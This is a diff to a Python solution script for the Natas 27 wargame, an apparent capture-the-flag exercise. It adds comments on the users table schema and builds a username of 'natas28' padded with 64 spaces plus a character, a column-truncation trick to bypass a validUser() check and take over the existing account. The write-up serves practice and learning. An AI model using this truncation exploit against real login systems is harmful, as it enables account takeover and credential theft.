@@ -73,3 +73,21 @@ print(f'{div_content}\n')
 Wrong password for user: natas28
 """
 # thus, we confirmed that natas28 does exist in the database
+
+
+# next, note that in the database schema, the maximum length of the username is 64 characters
+"""
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/ 
+"""
+# based on the reference site, we can skip the validUser() check by creating a new username
+# prefixed with natas28 and make it longer than 64 characters, i.e. by padding with whitespaces
+# and add any character at the end
+new_username = 'natas28' + ' ' * 64 + 'a'
+print(f'{new_username}\n')
+# we can skip the validUser() check because it will not trim the username and pass it as-is
+# therefore, comparing the new username above with natas28 will return False
